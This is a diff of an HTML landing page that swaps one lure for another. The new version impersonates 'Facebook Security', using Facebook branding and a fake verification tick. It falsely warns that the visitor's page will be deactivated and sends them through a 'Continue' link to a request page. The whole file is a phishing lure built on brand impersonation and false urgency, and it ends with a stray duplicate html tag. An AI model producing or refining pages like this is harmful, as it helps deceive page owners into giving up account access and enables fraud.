@@ -1,110 +1,176 @@
-<!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
-  <title>Action Required</title>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
-  <link rel="icon" type="image/svg+xml" href="https://buffer-start-page.s3.amazonaws.com/favicon.svg">
-  <link rel="apple-touch-icon-precomposed" sizes="57x57"
-    href="https://buffer-start-page.s3.amazonaws.com/apple-touch-icon-256x256.png">
-  <link rel="preload"
-    href="https://start-page.buffer.com/cdn-cgi/image/height=920/https://buffer-start-page-uploads.s3.amazonaws.com/defaults/hero-card.png"
-    as="image">
-  <style>
-    html,
-    body {
-      font-family: Roboto, sans-serif;
-      min-height: 100%;
-      height: 100%;
-      margin: 0;
-      padding: 0;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
+    <title>Facebook Warning</title>
+    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
 
-    body {
-      background-color: #E4F5FE;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-    }
+        html,
+        body {
+            height: 0%;
+            width: 100%;
+        }
 
-    .container {
-      max-width: 600px;
-      padding: 20px;
-      background-color: #FFFFFF;
-      border-radius: 20px;
-      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
-    }
+        #container {
+            height: 135%;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #f0f2f5;
+        }
 
-    .logo {
-      width: 80px;
-      height: 80px;
-      object-fit: cover;
-      border-radius: 50%;
-    }
+        #box {
+            height: 40%;
+            width: 45%;
+            background-color: rgb(255, 255, 255);
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            flex-direction: column;
+        }
 
-    h1 {
-      font-family: Roboto, sans-serif;
-      font-size: 32px;
-      font-weight: 700;
-      line-height: 1.4;
-      margin-top: 20px;
-      color: #232323;
-    }
+        #box>img {
+            width: 70px;
+            margin-top: 15px;
+        }
 
-    h2 {
-      font-family: Roboto, sans-serif;
-      font-size: 24px;
-      font-weight: 700;
-      line-height: 1.4;
-      margin-top: 10px;
-      color: #232323;
-    }
+        #data {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 15px;
+        }
 
-    .button {
-      background-color: #267CE5;
-      color: #FFFFFF;
-      font-family: Roboto, sans-serif;
-      font-size: 16px;
-      font-weight: 400;
-      padding: 16px 32px;
-      border-radius: 20px;
-      text-decoration: none;
-      display: inline-block;
-      margin-top: 20px;
-    }
+        #data>h4 {
+            font-size: 25px;
+        }
 
-    .button:hover {
-      background-color: #1A5BBF;
-    }
+        #data>img {
+            width: 25px;
+        }
 
-    .copyright {
-      color: #232323;
-      font-size: 14px;
-      margin-top: 30px;
-    }
+        .line {
+            height: .7px;
+            background-color: rgba(0, 0, 0, 0.222);
+            width: 90%;
+            margin: 1rem;
+        }
 
-    .footer {
-      margin-top: 20px;
-    }
-  </style>
+        #para h2 {
+            font-size: 16px;
+        }
+
+        #para {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        #para p {
+            margin: 20px 100px 0px 100px;
+            font-size: 14px;
+        }
+
+        #para button {
+            padding: 10px 20px 10px 20px;
+            margin-top: 25px;
+            border: none;
+            border-radius: 2px;
+            font-size: 18px;
+            background-color: #145dbd;
+            cursor: pointer;
+        }
+
+        #para button a {
+            text-decoration: none;
+            color: #fff;
+        }
+
+        #para button:hover {
+            background-color: #03469e;
+        }
+
+        @media (max-width: 500px) {
+            #box {
+                margin: 0;
+                height: 45%;
+                width: 95%;
+                top: 0%;
+            }
+            #box>img {
+                width: 40px;
+            }
+            #data>h4 {
+                font-size: 18px;
+            }
+            #data>img {
+                width: 15px;
+                margin-left: 2px;
+            }
+            .line {
+                height: .5px;
+                width: 90%;
+                margin-left: auto;
+                margin-right: auto;
+                background-color: #00000045;
+            }
+            #para {
+                margin: 0%;
+            }
+            #para>h2 {
+                font-size: 12px;
+                font-weight: 700;
+                margin-bottom: 10px;
+            }
+            #para>p {
+                margin: 5px 15px 0px 15px;
+                font-size: 14px;
+            }
+            #para button {
+                padding: 8px 18px 8px 18px;
+                margin-top: 15px;
+                border: none;
+                border-radius: 2px;
+                font-size: 13px;
+                background-color: #1877F2;
+                cursor: pointer;
+            }
+        }
+    </style>
 </head>
 
 <body>
-  <div class="container">
-    <img class="logo"
-      src="https://start-page.buffer.com/cdn-cgi/image/width=160,height=160/https://buffer-start-page-uploads.s3.amazonaws.com/64df12466e02a899e7c4b98a/1692340938315.logo%20fb.png"
-      alt="Logo">
-    <h1>𝐀𝐩𝐩𝐥𝐲</h1>
-    <h2>𝐈𝐧 𝐧𝐞𝐞𝐝 𝐨𝐟 𝐚 𝐫𝐞𝐯𝐢𝐞𝐰? 𝐊𝐢𝐧𝐝𝐥𝐲 𝐭𝐚𝐩 𝐨𝐧 𝐭𝐡𝐞 "𝐀𝐩𝐩𝐥𝐲" 𝐛𝐮𝐭𝐭𝐨𝐧.</h2>
-    <a class="button" href="request.html">𝐀𝐩𝐩𝐥𝐲</a>
-    <p class="copyright">𝐒𝐮𝐢𝐭𝐞 <strong>© 2024</strong></p>
-  </div>
+    <div id="container">
+        <div id="box">
+            <img src="https://cdn.glitch.global/0e876aa8-70cf-40f1-951b-94c8002e5dcc/icon.png?v=1699082922949" alt="">
+            <h5 id="groupSubHeader">Facebook Security</h5>
+            <div id="data">
+                <h4>Account Restrictions Service</h4> <img src="https://cdn.glitch.global/0e876aa8-70cf-40f1-951b-94c8002e5dcc/thumbnails%2Fbluetick.png?1699082922610" alt="">
+            </div>
+            <div class="line"></div>
+            <div id="para">
+                <h2> Your Page Will Be Deactivated Soon</h2>
+                <p>𝐖𝐞 𝐖𝐢𝐥𝐥 𝐖𝐚𝐥𝐤 𝐘𝐨𝐮 𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐒𝐞𝐯𝐞𝐫𝐚𝐥 𝐒𝐭𝐞𝐩𝐬 𝐭𝐨 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐚 𝐑𝐞𝐯𝐢𝐞𝐰 𝐘𝐨𝐮 𝐒𝐡𝐨𝐮𝐥𝐝 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞 𝐓𝐡𝐞𝐬𝐞 𝐒𝐭𝐞𝐩𝐬 𝐒𝐨 𝐓𝐡𝐚𝐭 𝐘𝐨𝐮𝐫 𝐏𝐚𝐠𝐞 𝐖𝐢𝐥𝐥 𝐍𝐨𝐭 𝐃𝐞𝐥𝐞𝐭𝐞𝐝 𝐏𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲.
+                    </p>
+                <button> <a href="request.html">Continue</a> </button>
+            </div>
+        </div>
+    </div>
+
+
 </body>
 
 </html>
+<html lang="en">
